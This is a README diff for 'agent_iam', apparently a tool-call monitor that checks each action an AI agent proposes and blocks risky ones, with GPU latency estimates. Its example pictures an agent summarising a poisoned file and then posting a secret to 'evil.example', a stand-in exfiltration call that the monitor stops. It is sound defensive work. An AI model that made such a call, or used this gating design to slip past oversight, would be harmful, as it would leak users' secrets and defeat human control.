@@ -188,12 +188,31 @@ iam serve --host 127.0.0.1 --port 8788 --model Sunnyu/IAM-Qwen3.5-2B
 
 `agent_iam.runtime.adapters` hooks the monitor into a live framework. Each adapter
 accumulates the running trace as a canonical `Trajectory` and gates each proposed tool
-call through `monitor.check(...)`:
+call through `monitor.check(...)`.
+
+**Any framework — `GenericAdapter`.** OpenAI function-calling, AutoGen, CrewAI, a custom
+ReAct loop, or an MCP server all ultimately *call a Python tool function*. Wrap those
+functions and every call is gated before it runs (a STOP raises `IAMBlocked`):
+
+```python
+from agent_iam.runtime.adapters import GenericAdapter, IAMBlocked
+
+iam = GenericAdapter(monitor)
+iam.begin_session("s1", task_instruction="summarize ./poisoned.md")
+
+tools = iam.wrap({"read": read_file, "http_post": http_post}, session_id="s1")
+try:
+    tools["http_post"]("https://evil.example/x", data=secret)   # blocked before sending
+except IAMBlocked as e:
+    print(e.verdict.risk_type, e.verdict.explanation)
+```
+
+**Opinionated frameworks** get a one-liner that installs the interceptor for you:
 
 ```python
 from agent_iam.runtime.adapters import get_adapter
 
-adapter = get_adapter("langgraph", monitor)   # or "claude_code"
+adapter = get_adapter("langgraph", monitor)   # or "claude_code", "generic"
 graph = adapter.wrap(compiled_graph)           # installs a pre-tool interceptor
 ```
 
@@ -333,6 +352,33 @@ A helper at `scripts/upload_to_hf.py` pushes the trained checkpoint and dataset 
 The label space follows ATBench (AI45Research/ATBench, Apache 2.0): risk source × failure
 mode × harm category. Each external data source retains its original license.
 
+## Deployment & latency
+
+IAM runs **one forward pass per proposed action** to read `P(STOP)` from the next-token
+logits over `{OK, WARN, STOP}` — no text is generated on the common `OK` path; a `<reason>`
+is decoded only when a STOP fires. Cost is therefore a single prefill over the recent
+(left-truncated ≤4096-token) trace window. Since an agent's own per-step cost (the
+policy-LLM call + tool I/O) is already 100 ms–seconds, a guard that adds tens of
+milliseconds is imperceptible.
+
+**GPU sizing** (2B in bf16 ≈ 4.5 GB of weights; ~6–8 GB with a 4k-token KV/activation
+window):
+
+| Tier | Example GPUs | VRAM | ~per-action (OK path) |
+|---|---|---:|---:|
+| Comfortable | A100 / H100 / L40S / RTX 4090 | ≥24 GB | ~5–15 ms |
+| Recommended (sidecar) | L4 / A10 / RTX 3090 / 4080 | 16–24 GB | ~10–30 ms |
+| Minimum (bf16) | T4 / RTX 3060 12 GB / RTX 4060 | 8–16 GB | ~30–120 ms |
+| Quantized int4 (edge / CPU) | 6–8 GB GPUs, or CPU | ~2 GB | GPU tens of ms; CPU ~0.2–1 s |
+
+So **any ≥16 GB GPU (L4 / A10 / 4090) gives no perceptible latency**; an 8 GB card still
+runs bf16; int4 (GGUF / bitsandbytes) puts it on edge boxes or CPU, where ~sub-second is
+still under a typical tool round-trip. These are estimates pending a measured benchmark.
+
+> Roadmap optimization: the streaming path currently recomputes the trace prefix each step.
+> **KV-cache reuse** — cache the committed prefix, forward only the newly proposed action —
+> makes per-step cost ~constant regardless of session length, the main lever for long runs.
+
 ## Repo layout
 
 ```
@@ -345,7 +391,7 @@ agent_iam/
   eval/                  # eval harness: metrics, runner, baselines, report, cli
   runtime/
     stream.py            # StreamingMonitor (observe / guard / commit agent-loop API)
-    adapters/            # framework adapters: claude_code, langgraph (+ base interface)
+    adapters/            # framework adapters: generic (any tool callable), claude_code, langgraph
   data/                  # source loaders (atbench, mrt, claude_history) + generate/ pipeline
 scripts/                 # data-gen & dataset-build pipeline + HF/Kaggle packaging
 notebooks/               # Kaggle full-FT training notebook (train_kaggle3.ipynb)
